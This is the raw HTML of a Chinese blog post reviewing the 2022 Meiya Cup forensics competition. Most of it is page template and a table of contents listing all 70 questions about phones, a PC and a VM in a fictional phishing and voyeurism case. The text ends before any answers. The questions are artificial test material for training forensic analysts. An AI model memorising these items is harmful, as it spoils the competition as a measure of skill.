@@ -1,0 +1,2863 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="四个小时还是太短了">
+<title>美亚杯2022取证总结</title>
+
+<link rel='canonical' href='https://blog.928330.xyz/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2022%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/'>
+
+<link rel="stylesheet" href="/scss/style.min.e3073096d25e5a3d746191d039ec1146fd3a3920d63ab62f3cacf37f04c37a53.css"><meta property='og:title' content="美亚杯2022取证总结">
+<meta property='og:description' content="四个小时还是太短了">
+<meta property='og:url' content='https://blog.928330.xyz/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2022%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/'>
+<meta property='og:site_name' content='kakahuote'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='forensics' /><meta property='article:tag' content='misc' /><meta property='article:published_time' content='2025-08-15T21:32:09&#43;08:00'/><meta property='article:modified_time' content='2025-08-15T21:36:22&#43;08:00'/>
+<meta name="twitter:title" content="美亚杯2022取证总结">
+<meta name="twitter:description" content="四个小时还是太短了">
+    <link rel="shortcut icon" href="/favicon.ico" />
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>加载动画</title>
+    <style>
+        .loading {
+            position: fixed;
+            display: flex;
+            flex-direction: column;  
+            justify-content: center;
+            align-items: center;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 99;
+            background-color: #f5f5fa;
+            transition: transform 1.5s, opacity 1.5s;
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .loader-bars {
+            display: flex;  
+            align-items: flex-end;  
+            gap: 3px;  
+            margin-bottom: 20px;  
+        }
+
+        .bar {
+            height: 5px;
+            width: 12px;
+            animation-duration: 0.45s;
+            animation-name: changeHeight;
+            animation-iteration-count: infinite;
+            animation-direction: alternate;
+        }
+
+        .red {
+            background-color: #E50000;
+            box-shadow: 1px 1px 10px #E50000;
+            animation-delay: 0.10s;
+        }
+
+        .orange {
+            background-color: #FF8D00;
+            box-shadow: 1px 1px 10px #FF8D00;
+            animation-delay: 0.20s;
+        }
+
+        .yellow {
+            background-color: #FFEE00;
+            box-shadow: 1px 1px 10px #FFEE00;
+            animation-delay: 0.25s;
+        }
+
+        .green {
+            background-color: #008121;
+            box-shadow: 1px 1px 10px #008121;
+            animation-delay: 0.30s;
+        }
+
+        .blue {
+            background-color: #004CFF;
+            box-shadow: 1px 1px 10px #004CFF;
+            animation-delay: 0.35s;
+        }
+
+        .violet {
+            background-color: #760188;
+            box-shadow: 1px 1px 10px #760188;
+            animation-delay: 0.40s;
+        }
+
+        @keyframes changeHeight {
+            from {
+                height: 5px;
+            }
+
+            to {
+                height: 40px;
+            }
+        }
+
+        .scaleAndFadeout {
+            transform: scale(1.5);
+            opacity: 0;
+        }
+
+         
+        .loading-text {
+            color: #333;  
+            font-size: 16px;  
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading">
+        <div class="loader-bars">
+            <div class="red bar"></div>
+            <div class="orange bar"></div>
+            <div class="yellow bar"></div>
+            <div class="green bar"></div>
+            <div class="blue bar"></div>
+            <div class="violet bar"></div>
+        </div>
+        <div class="loading-text">loading...</div>
+    </div>
+
+    <script>
+        function initLoading() {
+            let loading = document.querySelector(".loading");
+            document.addEventListener('DOMContentLoaded', function() {
+                setTimeout(() => {
+                    loading.classList.add("scaleAndFadeout");
+                    setTimeout(() => {
+                        loading.style.display = "none";
+                    }, 1500);
+                }, 50);
+            });
+        }
+
+        initLoading();
+    </script>
+
+</body>
+</html>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img class="site-logo original-logo" src="/img/avatar_hu_4804467f7cda2058.png" width="300" height="300" loading="lazy" alt="原始头像">
+                    
+                    
+                        
+                        <img class="site-logo hover-logo" src="/img/avatar-hover_hu_f231304c77e946da.png" width="300" height="300" loading="lazy" alt="悬停头像">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤝</span>
+                
+            </figure>
+            
+        
+
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">kakahuote</a></h1>
+            <h2 class="site-description">靡不有初，鲜克有终</h2>
+        </div>
+    </header>
+
+    <ol class="menu-social">
+                <li>
+                    <a
+                        href='https://bilibili.com'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a
+                        href='https://github.com'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            </ol>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#王晓琳手机1-14">王晓琳手机(1-14)</a>
+      <ol>
+        <li><a href="#1王晓琳手机的imei号是什么以阿拉伯数字回答">1.王晓琳手机的IMEI号是什么?(以阿拉伯数字回答)</a></li>
+        <li><a href="#2王晓琳的手机安装了什么即时通讯软件lnstant-messaging-apps">2.王晓琳的手机安装了什么即时通讯软件(lnstant Messaging Apps)?</a></li>
+        <li><a href="#3王晓琳于什么日子和时间曾经通过即时通讯软件发出一个pdf档案以时区utc8回答">3.王晓琳于什么日子和时间曾经通过即时通讯软件发出一个PDF档案?(以时区UTC+8回答)</a></li>
+        <li><a href="#4承上题这个-pdf-档案的md5哈希值hash-value-是什么以大写英文及阿拉伯数字回答">4.承上题，这个 PDF 档案的MD5哈希值(Hash Value) 是什么?(以大写英文及阿拉伯数字回答)</a></li>
+        <li><a href="#5王晓琳将这个pdf档案发给哪一个用户而该用户的手机号码是什么">5.王晓琳将这个PDF档案发给哪一个用户,而该用户的手机号码是什么?</a></li>
+        <li><a href="#6王晓琳发出这个pdf档案的原因是什么">6.王晓琳发出这个PDF档案的原因是什么?</a></li>
+        <li><a href="#7承上题分析王晓琳与上述用户的对话他们的关系是什么">7.承上题，分析王晓琳与上述用户的对话，他们的关系是什么?</a></li>
+        <li><a href="#8王晓琳于何时要求上述用户删除一张照片">8.王晓琳于何时要求上述用户删除一张照片?</a></li>
+        <li><a href="#9承上题该用户向王晓琳提出什么要求以删除这张照片">9.承上题，该用户向王晓琳提出什么要求以删除这张照片?</a></li>
+        <li><a href="#10王晓琳的手机里有什么电子书籍electronic-book-">10.王晓琳的手机里有什么电子书籍(Electronic Book) ?</a></li>
+        <li><a href="#11王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果highlight">11.王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果(Highlight)?</a></li>
+        <li><a href="#12王晓琳的手机里有一个-mtr-mobile-港铁的手机程序mobile-app检视其数据库database-的数据王晓琳于2022年10月11日-2204-时将一行程加入书签bookmark这段行程的起点及终点站包括">12.王晓琳的手机里有一个 &lsquo;MTR Mobile &lsquo;(港铁)的手机程序(Mobile App)。检视其数据库(Database) 的数据，王晓琳于2022年10月11日 22:04 时将一行程加入书签(Bookmark)，这段行程的起点及终点站包括?</a></li>
+        <li><a href="#13王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片以阿拉伯数字回答">13.王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片?(以阿拉伯数字回答)</a></li>
+        <li><a href="#14检视王晓琳的手机照片她于2022年10月2日到过什么地方">14.检视王晓琳的手机照片，她于2022年10月2日到过什么地方?</a></li>
+      </ol>
+    </li>
+    <li><a href="#李大辉的phone15-24">李大辉的Phone(15-24)</a>
+      <ol>
+        <li><a href="#15李大辉使用的是一台lg-v10的手机它的型号是什么">15.李大辉使用的是一台LG V10的手机，它的型号是什么?</a></li>
+        <li><a href="#16李大辉的手机最常搜索的类别category-是什么">16.李大辉的手机最常搜索的类别(Category) 是什么?</a></li>
+        <li><a href="#17李大辉最近光顾了一家美丰快运公司这快递件的单号是什么不要输入符号及空白以阿拉伯数字回答">17.李大辉最近光顾了一家美丰快运公司，这快递件的单号是什么?(不要输入符号及空白，以阿拉伯数字回答)</a></li>
+        <li><a href="#18李大辉收到的电邮中有一个钓鱼链结phishing-link这个链结的地址是什么">18.李大辉收到的电邮中有一个钓鱼链结(Phishing Link)，这个链结的地址是什么?</a></li>
+        <li><a href="#19承上题这封电邮是从哪个电邮地址寄出的">19.承上题，这封电邮是从哪个电邮地址寄出的?</a></li>
+        <li><a href="#20承上题寄出这封电邮的ip地址是">20.承上题，寄出这封电邮的IP地址是?</a></li>
+        <li><a href="#21李大辉手机有一个orderxlsx-的档案被加密了解密钥匙是什么">21.李大辉手机有一个order.xlsx 的档案被加密了，解密钥匙是什么?</a></li>
+        <li><a href="#22香港的街道上每一枝街灯都有编号分析李大辉手机里的程序-kmb-1933-哪一枝街灯在经度-latitude-224160270000-纬度-longitude-1142139450000-附近它的编号是什么以大㝍英文及阿拉伯数字回答">22.香港的街道上每一枝街灯都有编号。分析李大辉手机里的程序 &lsquo;KMB 1933&rsquo;， 哪一枝街灯在经度 (Latitude) 22.4160270000， 纬度 (Longitude) 114.2139450000 附近，它的编号是什么?(以大㝍英文及阿拉伯数字回答)</a></li>
+        <li><a href="#23李大辉的手机里有一张由该手机拍的照片照片的元资料metadata-曾被修改这张照片的档案名是什么以大写英文及数字回答不用回答副档名">23.李大辉的手机里有一张由该手机拍的照片，照片的元资料(Metadata) 曾被修改，这张照片的档案名是什么?(以大写英文及数字回答，不用回答副档名</a></li>
+        <li><a href="#24分析李大辉的手机里的资料他在哪一间公司工作">24.分析李大辉的手机里的资料，他在哪一间公司工作?</a></li>
+      </ol>
+    </li>
+    <li><a href="#林浚熙的iphone25-38">林浚熙的iphone(25-38)</a>
+      <ol>
+        <li><a href="#25林浚熙曾经以手机登录google账户的验证码是什么不要输入符号以大写英文及阿拉伯数字回答">25.林浚熙曾经以手机登录Google账户的验证码是什么?(不要输入符号，以大写英文及阿拉伯数字回答)</a></li>
+        <li><a href="#26林浚熙手机的-whatsapp-号码是什么号码swhatsappnet-以阿拉伯数字回答">26.林浚熙手机的&rsquo; WhatsApp&rsquo; 号码是什么?(号码)@s.whatsapp.net? (以阿拉伯数字回答)</a></li>
+        <li><a href="#27通过分析林浚熙手机的照片判断他在何处偷拍王晓琳">27.通过分析林浚熙手机的照片，判断他在何处偷拍王晓琳?</a></li>
+        <li><a href="#28林浚熙曾经删掉自己拍摄的照片这张照片的档案名filename-是什么不要输入以大写英文及阿拉伯数字回答如cat10jpg需回答cat10jpg">28.林浚熙曾经删掉自己拍摄的照片，这张照片的档案名(Filename) 是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG)</a></li>
+        <li><a href="#29王晓琳曾经发送一个pdf档案予林浚熙这个档案的文件签名file-signature-是什么以十六进制数字答首八位数值如foa1c5e1">29.王晓琳曾经发送一个PDF档案予林浚熙，这个档案的文件签名(File Signature) 是什么?(以十六进制数字答首八位数值，如FOA1C5E1)</a></li>
+        <li><a href="#30承上题该pdf档案内包含一位曾经被肩的受害者资料分析林熙手机的数据这位受害者的英文名字是什么不要输入符号及空白以大写英文回答">30.承上题，该PDF档案内包含一位曾经被肩的受害者资料。分析林熙手机的数据，这位受害者的英文名字是什么?(不要输入符号及空白，以大写英文回答)</a></li>
+        <li><a href="#31分析林浚熙手机上的数据他在2022年10月17日计划去什么地方">31.分析林浚熙手机上的数据，他在2022年10月17日计划去什么地方?</a></li>
+        <li><a href="#32承上题上述行程的结束时间是如答案为-10159需回答160159">32.承上题，上述行程的结束时间是?(如答案为 1:01:59，需回答160159)</a></li>
+        <li><a href="#33于林浚熙的手机里在2022年9月1日或以后哪一张照片是由其他手机拍摄的而它的档案名是什么不要输入以大写英文及阿拉伯数字回答如-cat10jpg需回答cat10jpg">33.于林浚熙的手机里，在2022年9月1日或以后，哪一张照片是由其他手机拍摄的，而它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG)</a></li>
+        <li><a href="#34根据照片的数据库photossqlite-资料哪一个栏目标题column-header-可以显示这张照片的接收方式">34.根据照片的数据库（Photos.sqlite) 资料，哪一个栏目标题(Column Header) 可以显示这张照片的接收方式?</a></li>
+        <li><a href="#35承上题这张照片通过什么方式接收">35.承上题，这张照片通过什么方式接收?</a></li>
+        <li><a href="#36承上题这张照片原本的档案名original-filename-是什么不要输入以大写英文及阿拉伯数字回答如-cat10jpg需回答cat10jpg">36.承上题，这张照片原本的档案名(Original Filename) 是什么?不要输入，以大写英文及阿拉伯数字回答。如 Cat10,jpg，需回答CAT10JPG)</a></li>
+        <li><a href="#37林浚熙手机里有一个备忘录notes被上了锁这个备忘录的名称是什么以大写英文及阿拉数字回答">37.林浚熙手机里有一个备忘录(Notes)被上了锁，这个备忘录的名称是什么?(以大写英文及阿拉数字回答)</a></li>
+        <li><a href="#38承上题上述备忘录的内容有一串数字它是什么以阿拉伯数字回答">38.承上题，上述备忘录的内容有一串数字，它是什么?(以阿拉伯数字回答)</a></li>
+      </ol>
+    </li>
+    <li><a href="#林浚熙计算机39-52">林浚熙计算机(39-52)</a>
+      <ol>
+        <li><a href="#39林浚熙计算机computer-的操作系统operating-system-版本是什么">39.林浚熙计算机(Computer) 的操作系统(Operating System) 版本是什么?</a></li>
+        <li><a href="#40林浚照计算机安装了什么品牌的虚拟专用网络-virtual-private-network---vpn软件不要输入符号及空白以大写英文及阿拉伯数字回答">40.林浚照计算机安装了什么品牌的虚拟专用网络 Virtual Private Network - VPN)软件?(不要输入符号及空白，以大写英文及阿拉伯数字回答)</a></li>
+        <li><a href="#41承上题分析该虚拟专用网络的日志log他在哪天安装该虚拟专用网络如答案为-2022-12-29需回答-20221229">41.承上题，分析该虚拟专用网络的日志(Log)，他在哪天安装该虚拟专用网络?(如答案为 2022-12-29，需回答 20221229)</a></li>
+        <li><a href="#42检视林浚照计算机的数据他使用哪种加密货币cryptocurrency-以支付虚拟专用网络软件以大写英文回答该加密货币的全名如-bitcoin">42.检视林浚照计算机的数据，他使用哪种加密货币(Cryptocurrency) 以支付虚拟专用网络软件?以大写英文回答该加密货币的全名，如 BITCOIN)</a></li>
+        <li><a href="#43林浚熙的加密货币钱包cryptocurrency-wallet-名称是什么不要输入符号以大写英文及阿拉伯数字回答">43.林浚熙的加密货币钱包Cryptocurrency Wallet) 名称是什么?不要输入符号，以大写英文及阿拉伯数字回答)</a></li>
+        <li><a href="#44林浚熙计算机里安装了哪个浏览器web-browser">44.林浚熙计算机里安装了哪个浏览器(Web Browser)?</a></li>
+        <li><a href="#45林浚熙使用浏览器google-chrome曾经浏览最多的是哪-个网站">45.林浚熙使用浏览器Google Chrome曾经浏览最多的是哪 个网站?</a></li>
+        <li><a href="#46除了上述网站林浚熙曾使用浏览器google-chrome搜索过什么">46.除了上述网站,林浚熙曾使用浏览器Google Chrome搜索过什么?</a></li>
+        <li><a href="#47林浚照的计算机安装了一个通讯软件signal它的用户资讯储存路径是什么">47.林浚照的计算机安装了一个通讯软件Signal，它的用户资讯储存路径是什么?</a></li>
+        <li><a href="#48通讯软件signal采用一个档案存放用户的聊天记录它的档案名是什么不要输入以大写英文及阿拉伯数字回答如cat10jpg需回答cat10jpg">48.通讯软件Signal采用一个档案存放用户的聊天记录，它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG)</a></li>
+        <li><a href="#49承上题对上档案进行分析林发熙的联络人当中有多少人安装了siqnal以阿拉伯数字回答">49.承上题，对上档案进行分析，林发熙的联络人当中有多少人安装了Siqnal?(以阿拉伯数字回答)</a></li>
+        <li><a href="#50林浚熙在signal-曾经与某人对话那人的手机号码是什么-需要与区码area-code-一同答以阿拉伯数字">50.林浚熙在“Signal&rsquo; 曾经与某人对话，那人的手机号码是什么? 需要与区码(Area Code) 一同答(以阿拉伯数字)</a></li>
+        <li><a href="#51承上题两人在signal-的对话中有些讯息message-包含附件这些讯息的-id包括">51.承上题，两人在Signal&rsquo; 的对话中有些讯息(Message) 包含附件，这些讯息的 &lsquo;ID&rsquo;包括?</a></li>
+        <li><a href="#52承上题林浚熙曾经于2022年10月20日转账transfer-money-予上述对话人士那次转账的参考编号是什么以大写英文及阿拉伯数字回答">52.承上题，林浚熙曾经于2022年10月20日转账（Transfer Money) 予上述对话人士,那次转账的参考编号是什么?(以大写英文及阿拉伯数字回答)</a></li>
+      </ol>
+    </li>
+    <li><a href="#林浚熙的vm53-70">林浚熙的VM(53-70)</a>
+      <ol>
+        <li><a href="#53林浚熙的计算机安装了多少台虚拟机virtual-machine---vm-以阿拉伯数字回答">53.林浚熙的计算机安装了多少台虚拟机Virtual Machine - VM) ?(以阿拉伯数字回答)</a></li>
+        <li><a href="#54林浚熙的计算机里的虚拟机vm-存放在什么路径">54.林浚熙的计算机里的虚拟机(VM) 存放在什么路径?</a></li>
+        <li><a href="#55虚拟机-vm-使用什么版本的作业系统operating-system-">55.虚拟机 (VM) 使用什么版本的作业系统(Operating System) ?</a></li>
+        <li><a href="#56虚拟机vm-中的文件传输服务器ftp-server-有哪些用户">56.虚拟机(VM) 中的文件传输服务器(FTP Server) 有哪些用户?</a></li>
+        <li><a href="#57虚拟机设置了什么网页服务器web-server">57.虚拟机设置了什么网页服务器(Web Server)?</a></li>
+        <li><a href="#58网页服务器目录内有图片档案而此档案的储存位置是">58.网页服务器目录内有图片档案，而此档案的储存位置是?</a></li>
+        <li><a href="#59分析网页服务器的网站数据假网站的公司名称是什么">59.分析网页服务器的网站数据，假网站的公司名称是什么?</a></li>
+        <li><a href="#60检视假网站首页的显示ay806369745hk-代表什么">60.检视假网站首页的显示，AY806369745HK 代表什么?</a></li>
+        <li><a href="#61分析假网站的资料当受害人经假网站输入数据后网站会产生一个档案它的档案名是什么不要输入以大写英文及阿拉数字回答如-cat10jpg需回答cat10jpg">61.分析假网站的资料，当受害人经假网站输入数据后，网站会产生一个档案，它的档案名是什么?(不要输入“，以大写英文及阿拉数字回答。如 Cat10.jpg，需回答CAT10JPG)</a></li>
+        <li><a href="#62分析假网站档案processphp-源码source-code推测此档案的用途可能是">62.分析假网站档案，process.php&rsquo; 源码(Source Code),推测此档案的用途可能是?</a></li>
+        <li><a href="#63检视档案processphp-源码-林浚照的电邮密码是以大写英文回答">63.检视档案process.php&rsquo; 源码, 林浚照的电邮密码是?(以大写英文回答)</a></li>
+        <li><a href="#64分析档案processphp-源码-它不会收集哪些资料">64.分析档案process.php&rsquo; 源码, 它不会收集哪些资料?</a></li>
+        <li><a href="#65虚拟机-vm-安装了-docker-程序列出一个以5作为开端的-docker-镜像-image-id-以阿拉伯数字及大写英文回答">65.虚拟机 (VM) 安装了 Docker 程序，列出一个以'5&rsquo;作为开端的 &lsquo;Docker&rsquo; 镜像 (Image) ID (以阿拉伯数字及大写英文回答)</a></li>
+        <li><a href="#66docker-容器-container-mysql-对外开放的通讯端口-port-是">66.Docker 容器 (Container) &lsquo;mysql&rsquo; 对外开放的通讯端口 (Port) 是?</a></li>
+        <li><a href="#67docker容器mysql用户root-的密码是以大写英文及阿拉伯数字回答">67.Docker容器mysql，用户&rsquo;root&rsquo; 的密码是?(以大写英文及阿拉伯数字回答)</a></li>
+        <li><a href="#68docker容器mysql-里哪一个数据库储存了大量个人资料以大写英文回答">68.Docker容器，mysql 里哪一个数据库储存了大量个人资料?(以大写英文回答)</a></li>
+        <li><a href="#69检视-docker-容器mysql-内数据库里的资料李大辉的出生日期是如答案为-2022-12-29需答-20221229">69.检视 Docker 容器&rsquo;mysql&rsquo; 内数据库里的资料，李大辉的出生日期是?(如答案为 2022-12-29，需答 20221229)</a></li>
+        <li><a href="#70通过取证调查结果进行分析包括但不限于以上问题及情节林浚熙的行为涉及哪一种罪案">70.通过取证调查结果进行分析(包括但不限于以上问题及情节)，林浚熙的行为涉及哪一种罪案?</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/" >
+                比赛复盘
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+
+
+        <h2 class="article-title">
+            <a href="/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2022%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/">美亚杯2022取证总结</a>
+        </h2>
+        
+        <h3 class="article-subtitle">
+            四个小时还是太短了
+        </h3>
+        
+
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">
+                    发布时间：2025-08-15</time>
+            </div>
+        
+
+        
+
+        <div class="article-lastmod">
+               <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+               <time>
+                   更新时间：2025-08-15
+               </time>
+           </div>
+        <div>
+            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-eye"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0" /><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6" /></svg>
+            <time class="article-time--published">
+                浏览量：<span class="waline-pageview-count" data-waline-pageview-count="0">0</span>
+            </time>
+        </div>
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>最诡异的一集，资格赛恐怖如斯</p>
+<p>过程中要数次用到数据库，最好可以使用navicate</p>
+<p>检材分卷压缩，一共九卷，解压之后使用Veracrypt挂载就能得到题目</p>
+<h1 id="王晓琳手机1-14">王晓琳手机(1-14)
